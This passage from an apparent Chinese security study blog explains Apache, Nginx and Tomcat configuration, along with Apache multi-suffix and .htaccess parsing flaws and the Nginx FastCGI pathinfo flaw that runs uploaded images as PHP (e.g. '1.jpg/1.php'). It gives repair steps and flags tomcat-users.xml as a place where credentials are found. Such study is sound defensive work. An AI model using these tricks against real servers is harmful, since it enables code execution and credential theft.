title="&lt;LocationMatch&gt;指令"></a>&lt;LocationMatch&gt;指令</h5><p>将封装的指令作用于正则表达式匹配的URL。</p><p>&lt;LocationMatch&gt;和&lt;Location&gt;指令相同，提供了基于URL的访问控制。但它使用正则表达式作为参数，而不是简单字符串。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocationMatch &quot;&#x2F;(extra|special)&#x2F;data&quot;&gt;</span><br></pre></td></tr></table></figure><p>将匹配包含子串”/extra/data”或”/special/data”的URL。</p><p>更多介绍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jishume&#x2F;articles&#x2F;2079697.html</span><br></pre></td></tr></table></figure><h5 id="SetHandler指令"><a href="#SetHandler指令" class="headerlink" title="SetHandler指令"></a>SetHandler指令</h5><p>为具有特定文件 extensions 的文件配置特定处理程序。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h5 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h5><p><code>AddType</code>指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。本指令可用来增加没有在媒体类型文件(参阅<code>TypesConfig</code>指令)中定义的映射关系。</p><h5 id="AddHandle"><a href="#AddHandle" class="headerlink" title="AddHandle"></a>AddHandle</h5><p>指定带extension扩展名的文件应被handler-name处理器来处理。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。例如，为了把扩展名为<code>.cgi</code>的文件作为CGI脚本来处理，你应该定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .cgi</span><br></pre></td></tr></table></figure><p>一旦将上述定义放在你的http.conf文件中，所有包含<code>.cgi</code>扩展名的文件，都会被当成是CGI程序。</p><p><code>AddHandler application/x-httpd-php .jpg</code>。</p><p>.jpg后缀的文件会交给php去处理,进而执行文件中的php代码。</p><h3 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="漏洞介绍及成因-3"><a href="#漏洞介绍及成因-3" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题。</p><p>Apache文件解析漏洞涉及到一个解析文件的特性：</p><p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.types内），则继续向左识别，当我们请求这样一个文件：steady.xxx.yyy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady-&gt;无法识别，向左xxx-&gt;无法识别，向左-&gt;php-&gt;发现后缀是php，交给php处理这个文件。</span><br></pre></td></tr></table></figure><p>1.php.jpg成功的前提是:</p><ul><li><p>mime文件或者AddType没有设置jpg的对应的类型,apache识别不了jpg,进而识别PHP(大多数都能识别jpg)</p></li><li><p>配置文件使用<code>AddHandler</code>,以至于无论后缀文件是什么,有几个,只要看见该指令指定的文件类型,就交给php解析</p><p><code>AddHandler application/x-httpd-php 文件类型</code></p></li></ul><p>以上条件满足之一就可(1.php.xxx同理)</p><p>无论后缀有几个,有多少只要看见php就会被解析,前提:</p><ul><li>使用了AddHandle、&lt;FilesMatch&gt;</li></ul><h4 id="Apache的-htaccess利用技巧"><a href="#Apache的-htaccess利用技巧" class="headerlink" title="Apache的.htaccess利用技巧"></a>Apache的.htaccess利用技巧</h4><p><code>.htaccess</code> 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 <code>Apache</code> 的 <code>AllowOverride</code> 指令来设置。</p><h6 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h6><p><code>.htaccess</code> 文件中的配置指令作用于 <code>.htaccess</code> 文件所在的目录及其所有子目录，子目录中的指令会覆盖父目录或者主配置文件中的指令。</p><h6 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器的主配置文件将 AllowOverride 设置为 All</span><br></pre></td></tr></table></figure><p>注意该文件的名字可以随意更改。</p><h6 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h6><p>1、htaccess文件</p><ul><li>&lt;Directory&gt;中配置<code>AllowOverride None </code></li></ul><p>也就是在当前目录下htaccess文件不起作用</p><ul><li>http.conf主配置文件中禁止该类文件运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;.ht*&quot;&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure><p>2、php文件</p><ul><li>限制php的运行,直接使用&lt;Files&gt;禁止任何php的运行以及访问</li><li>如果想允许php文件的运行,使用&lt;FilesMatch&gt;中的正则表达式严格限制后缀,不建议使用AddHandle</li></ul><p>3、隐藏banner信息</p><p>ServerTokens OS　 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）</p><p>ServerSignature On 修改为：ServerSignature Off（不回显apache版本信息）</p><p>4、删除默认网站及页面</p><p>删除默认的页面，防止泄露服务器信息</p><p>5、合理配置apache的运行账户</p><p>为apache单独建立一个运行账户及账户组，并在httpd.conf配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure><p>6、合理控制apache运行账户对磁盘的写入，执行权限</p><p>取消apache运行账户对网站目录的写入权限，上传目录除外，其他非网站目录尽量不给权限</p><p>7、配置httpd.conf取消对上传目录的php执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">    &lt;FilesMatch &quot;.(php|php5)$&quot;&gt;     </span><br><span class="line">        Deny from all     </span><br><span class="line">    &lt;&#x2F;FilesMatch&gt; </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure><p>8、配置httpd.conf限制禁止访问的文件夹，例如后台目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">        Deny from all     </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure><p>9、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">    Allow from 192.168.1.111    </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure><p>10、配置httpd.conf修改修改监听端口来防止一些内部系统被扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listen 12345 </span><br></pre></td></tr></table></figure><p>11、关闭对.htaccess的支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None </span><br></pre></td></tr></table></figure><h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h4 id="漏洞介绍及成因-4"><a href="#漏洞介绍及成因-4" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>由于配置错误导致的目录遍历。</p><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接访问ip，比如127.0.0.1，可遍历路径。</p><p>修改apache配置文件httpd.conf</p><p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h3 id="Nginx学习"><a href="#Nginx学习" class="headerlink" title="Nginx学习"></a>Nginx学习</h3><h4 id="nginx是如何解析php的"><a href="#nginx是如何解析php的" class="headerlink" title="nginx是如何解析php的?"></a>nginx是如何解析php的?</h4><h5 id="CGI、fast-cgi"><a href="#CGI、fast-cgi" class="headerlink" title="CGI、fast-cgi"></a>CGI、fast-cgi</h5><p>早期服务器只能解析html、js这样的静态资源,但是我们如果要想解析php这样的动态语言怎么办？服务器解析不了我们可以使用php解析器,然后解析器与服务器之间进行交流,不同的解析器与服务器进行交流要靠CGI协议,只要你按照CGI协议去编写程序,就能实现他们之间的交流.常见的php解析器(遵循CGI协议)有php-cgi、php-fpm.</p><p>对于cgi协议,服务器在每次接受到请求的时候都会fork一个进程,请求结束就要kill这个进程,有1000个请求,就要kill、fork1000次,很显然有点浪费.</p><p>Fast-cgi每次fork一个进程的时候,并不会去立即kill,而是一个fork可以处理多个请求。</p><p><strong>fast-cgi一个进程会处理多个请求,大大提高了效率</strong></p><p>php-fpm是一种利用fast-cgi的php解析器,提供进程管理的功能.</p><p>进程包含master和worker进程,master进程之后一个负责监听端口,接受服务器的请求,worker进程可以有多个,每一个进程内部都有php解析器,是php代码执行的地方.</p><h5 id="nginx与php-fpm"><a href="#nginx与php-fpm" class="headerlink" title="nginx与php-fpm"></a>nginx与php-fpm</h5><p>我们知道nginx有反向代理的功能,可以来处理客户端、服务端之间的请求和相应,而php-fpm在这里可以说是一个代理服务器的作用,nginx服务器接受到文件不会去处理,会交给php解析器php-fpm。</p><p>nginx.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           /Applications/MxSrvs/www;</span><br><span class="line">    <span class="comment">//后面的地址就是php解析器,php-fpm的的地址</span></span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">10080</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">   <span class="comment">//设置传递给php解析器的参数值,以下的路径是指在安装php-fpm主机上存放php文件的路径</span></span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">  <span class="comment">//SCRIPT_FILENAME是什么呢？他是一个参数,我们nginx需要把参数传递给&quot;代理服务器&quot;php-fpm,后面的就是参数的值,只不过他们是由固定变量组成的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param SCRIPT_FILENAME $documentroot$fastcgi_script_name;#脚本文件请求的路径</span><br><span class="line">fastcgi_param QUERY_STRING $query_string; #请求的参数;如?app&#x3D;123</span><br><span class="line">fastcgi_param REQUEST_METHOD $request_method; #请求的动作(GET,POST)</span><br><span class="line">fastcgi_param CONTENT_TYPE $content_type; #请求头中的Content-Type字段</span><br><span class="line">fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。</span><br><span class="line">fastcgi_param SCRIPT_NAME $fastcgi_script_name; #脚本名称</span><br><span class="line">fastcgi_param REQUEST_URI $request_uri; #请求的地址不带参数</span><br><span class="line">fastcgi_param DOCUMENT_URI document_uri; #与document_uri; #与uri相同。</span><br><span class="line">fastcgi_param DOCUMENT_ROOT $document_root; #网站的根目录。在server配置中root指令中指定的值</span><br><span class="line">fastcgi_param PATH_INFO $path_info;#可自定义变量</span><br></pre></td></tr></table></figure><h5 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www.example.com</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">      Nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">路由到www.example.com&#x2F;index.php</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">加载nginx的fast-cgi模块</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">fast-cgi监听127.0.0.1:9000地址</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">www.example.com&#x2F;index.php请求到达127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 监听127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 接收到请求，启用worker进程处理请求</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 处理完请求，返回给nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">nginx将结果通过http返回给浏览器</span><br></pre></td></tr></table></figure><h4 id="nginx的pathinfo配置"><a href="#nginx的pathinfo配置" class="headerlink" title="nginx的pathinfo配置"></a>nginx的pathinfo配置</h4><p>讲之前我们需要理解一下伪静态,静态是指静态页面比如html、css等,没有页面交互,动态自然指的是动态页面,有页面交互,伪静态就是动态页面的静态表现.</p><p>我们在开发的时候经常使用MVC模式,由此我们在URL中访问网站也需要指定M、V、C参数,比如<code>http://www.cxzaixian.com/index.php?m=topic&amp;a=detail&amp;tid=82</code>,转化为伪静态之后是<code>http://www.cxzaixian.com/index.php/topic/detail/tid/82.html</code>.</p><p>后台代码拿到为静态URL之后,由相应的解析逻辑代码进行转化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache服务器本身是支持pathinfo的，通过简单修改几项配置即可。当配置支持pathinfo后，在php应用程序中，通过_SERVER[&#39;PATH_INFO&#39;]变量获取pathinfo值为&#x2F;topic&#x2F;detail&#x2F;tid&#x2F;82.html。 我们就可以很容易通过php逻辑代码来解析出controller文件、action方法、以及剩余的动态参数，进而就可以返回正确的网页响应。</span><br><span class="line">但是我们要说的nginx服务器默认是不支持pathinfo模式访问。实质上就是nginx不会去设置环境变量PATH_INFO 的值，导致php应用程序不能通过_SERVER[&#39;PAHT_INFO&#39;]来获取path_info, 也就不能解析出对应的动态参数。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    <span class="comment">#定义变量 $path_info ，用于存放pathinfo信息</span></span><br><span class="line">    set $path_info <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">#定义变量 $real_script_name，用于存放真实地址</span></span><br><span class="line">    set $real_script_name $fastcgi_script_name;</span><br><span class="line">    <span class="comment">#如果地址与引号内的正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span> ($fastcgi_script_name ~ <span class="string">&quot;^(.+?\.php)(/.+)$&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">#将文件地址赋值给变量 $real_script_name</span></span><br><span class="line">        set $real_script_name $<span class="number">1</span>;</span><br><span class="line">            <span class="comment">#将文件地址后的参数赋值给变量 $path_info</span></span><br><span class="line">            set $path_info $<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#配置fastcgi的一些参数</span></span><br><span class="line">    fastcgi_param SCRIPT_NAME $real_script_name;</span><br><span class="line">    fastcgi_param PATH_INFO $path_info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用-php-的-cgi-fix-pathinfo-功能"><a href="#使用-php-的-cgi-fix-pathinfo-功能" class="headerlink" title="使用 php 的 cgi.fix_pathinfo 功能"></a>使用 php 的 cgi.fix_pathinfo 功能</h5><p>此方式通过将 <code>php.ini</code> 当中的 <code>cgi.fix_pathinfo</code> 设置为1, 并且在 <code>nginx</code> 中加入一条 <code>fastcgi_param PATH_INFO $fastcgi_script_name;</code></p><p>当开启 <code>fix_pathinfo</code> 之后, <code>php</code> 会根据 <code>CGI 1.1</code> 的规范来分析 <code>SCRIPT_FILENAME</code>, 从中截取什么是真正的执行脚本, 什么是 <code>PATH_INFO</code>, 并且修正对应的变量</p><h3 id="FAST-CGI解析漏洞"><a href="#FAST-CGI解析漏洞" class="headerlink" title="FAST-CGI解析漏洞"></a>FAST-CGI解析漏洞</h3><h4 id="漏洞介绍及成因-5"><a href="#漏洞介绍及成因-5" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>nginx.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php($|&#x2F;) &#123;</span><br><span class="line">     fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">     fastcgi_index  index.php;</span><br><span class="line">     set $script    $uri;</span><br><span class="line">     set $path_info &quot;&quot;;</span><br><span class="line">     if ($uri ~ &quot;^(.+\.php)(&#x2F;.*)&quot;) &#123;</span><br><span class="line">          set  $script     $1;</span><br><span class="line">          set  $path_info  $2;</span><br><span class="line">     &#125;</span><br><span class="line">     include       fastcgi_params;</span><br><span class="line">     fastcgi_param SCRIPT_FILENAME   $document_root$script;</span><br><span class="line">     fastcgi_param SCRIPT_NAME       $script;</span><br><span class="line">     fastcgi_param PATH_INFO         $path_info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过正则匹配以后, SCRIPT_NAME会被设置为”fake.jpg/foo.php”, 继而构造成SCRIPT_FILENAME传递个PHP CGI，fix_pathinfo开启之后PHP会认为SCRIPT_FILENAME是fake.jpg, 而foo.php是PATH_INFO, 然后PHP就把fake.jpg当作一个PHP文件来解释执行。</p><p>最重要的一点是 <code>php-fpm.conf</code> 中的 <code>security.limit_extensions</code> 配置项限制了 <code>fastcgi</code> 解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许 <code>fastcgi</code> 将 <code>.png</code> 等文件当做代码解析。</p><p>尝试浏览器访问一下,具体的文件路径,可以看到脚本名字、脚本路径</p><p><code>&lt;?php var_dump($_SERVER)?&gt;</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25A99970-DF7A-4DB1-9CFA-8A634944B783.png" alt="25A99970-DF7A-4DB1-9CFA-8A634944B783"></p><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x2F;1.jpg&#x2F;1.php</span><br></pre></td></tr></table></figure><h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><code>http://xiumu.blog.51cto.com/hacker.jpg/abc.php</code>成功利用的前提</p><p>1、php.ini中的配置选项<code>cgi.fix_pathinfo=1</code>并且php-fpm中的<code>security.limit_extensions</code>没有开启</p><p>从5.3.9开始,php官方加入了一个配置”security.limit_extensions”,默认只允许执行扩展名为”.php”的文件,造成了其他类型的文件不支持的问题.</p><p>将 cgi.fix_pathinfo = 0 ,可能会导致很多MVC框架(如ThinkPHP)对url美化无法正常运行。</p><p>防御思路</p><p>1、开启</p><p><code>security.limit_extensions=.php</code> 只允许后缀为php的文件解析</p><p>2、</p><p>使用 nginx 的 fastcgi_split_path_info 功能</p><p>此种方式依赖 <code>nginx</code> 的 <code>fastcgi_split_path_info</code> 指令, 该指令通过正则表达式来对 <code>uri</code> 进行处理, 从中分理出真实脚本文件和 <code>PATH_INFO</code>, 并根据正则捕获组来设置两个重要变量</p><ol><li>$fastcgi_script_name</li><li>$fastcgi_path_info</li></ol><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png" alt="8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC"></p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat学习"><a href="#Tomcat学习" class="headerlink" title="Tomcat学习"></a>Tomcat学习</h3><h4 id="Tomcat与Servlet"><a href="#Tomcat与Servlet" class="headerlink" title="Tomcat与Servlet"></a>Tomcat与Servlet</h4><h5 id="Tomcat-1"><a href="#Tomcat-1" class="headerlink" title="Tomcat"></a>Tomcat</h5><h6 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h6><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930141720152.png" alt="image-20200930141720152"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* bin       :tomcat的执行的文件.</span><br><span class="line">* conf      :tomcat的配置文件.</span><br><span class="line">* lib       :tomcat运行的需要的jar包.</span><br><span class="line">* logs      :tomcat的运行的日志文件.</span><br><span class="line">* temp      :tomcat产生临时文件存放的路径.</span><br><span class="line">* webapps   :tomcat发布的web项目的路径.</span><br><span class="line">* work      :tomcat运行JSP的时候,JSP翻译成Servlet的代码存放的路径.</span><br></pre></td></tr></table></figure><h6 id="Tomcat发布项目"><a href="#Tomcat发布项目" class="headerlink" title="Tomcat发布项目"></a>Tomcat发布项目</h6><ul><li><p>将编写并编译好的web项目(注意要是编译好的，如果是 eclipse，可以将项目打成 war 包放入)，放入到 webapps 中。</p><p>在浏览器输入：<code>http://localhost:8080/</code>项目名/访问的文件名。</p></li><li><p>打开tomcat下conf/server.xml，在<code>&lt;Host&gt; &lt;/Host&gt;</code>标签之间输入项目配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context path&#x3D;&quot;&#x2F;WebProject&quot; docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>path:浏览器访问时的路径名</p><p>docBase:web项目的WebRoot所在的路径，注意是WebRoot的路径，不是项目的路径。其实也就是编译后的项目</p><p>reloadble:设定项目有改动时，tomcat是否重新加载该项目</p><p>浏览器访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080&#x2F;WebProject&#x2F;HelloTomcat.jsp</span><br></pre></td></tr></table></figure></li><li><p>进入到 apache-tomcat-7.0.52\conf\Catalina\localhost 目录，新建一个 项目名.xml 文件。</p><p>在 那个新建的 xml 文件中，增加下面配置语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context  docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>localhost:8080/xml文件名/访问的文件名。</p></li></ul><p>①、第一种方法比较普通，但是我们需要将编译好的项目重新 copy 到 webapps 目录下，多出了两步操作。</p><p>②、第二种方法直接在 server.xml 文件中配置，但是从 tomcat5.0版本开始后，server.xml 文件作为 tomcat 启动的主要配置文件，一旦 tomcat 启动后，便不会再读取这个文件，因此无法再 tomcat 服务启动后发布 web 项目。</p><p>③、第三种方法是最好的，每个项目分开配置，tomcat 将以\conf\Catalina\localhost 目录下的 xml 文件的文件名作为 web 应用的上下文路径，而不再理会<code> &lt;Context&gt;</code>中配置的 path 路径，因此在配置的时候，可以不写path。</p><h6 id="Tomcat敏感目录"><a href="#Tomcat敏感目录" class="headerlink" title="Tomcat敏感目录"></a>Tomcat敏感目录</h6><h6 id="tomcat-users-xml-用户配置文件"><a href="#tomcat-users-xml-用户配置文件" class="headerlink" title="tomcat-users.xml 用户配置文件"></a>tomcat-users.xml 用户配置文件</h6><p>获取用户账户、密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename&#x3D;&quot;tomcat&quot;&#x2F;&gt;</span><br><span class="line">  &lt;role rolename&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;both&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat,role1&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;role1&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><h6 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h6><p>Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户.而Servlet是一种运行在支持Java语言的服务器上的组件. Servlet最常见的用途是扩展Java Web服务器功能,提供非常安全的,可移植的,易于使用的CGI替代品.</p><p>从http协议中的请求和响应可以得知，浏览器发出的请求是一个请求文本，而浏览器接收到的也应该是一个响应文本。但是在上面这个图中，并不知道是如何转变的，只知道浏览器发送过来的请求也就是request，我们响应回去的就用response。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152555870.png" alt="image-20200930152555870"></p><p>①：Tomcat将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，所有的HTTP头数据读可以通过request对象调用对应的方法查询到。</p><p>②：Tomcat同时会要响应的信息封装为HttpServletResponse类型的response对象，通过设置response属性就可以控制要输出到浏览器的内容，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器　</p><p>Java Servlet API 是Servlet容器(tomcat)和servlet之间的接口，它定义了serlvet的各种方法，还定义了Servlet容器传送给Servlet的对象类，其中最重要的就是ServletRequest和ServletResponse。所以说我们在编写servlet时，需要实现Servlet接口，按照其规范进行操作。</p><h6 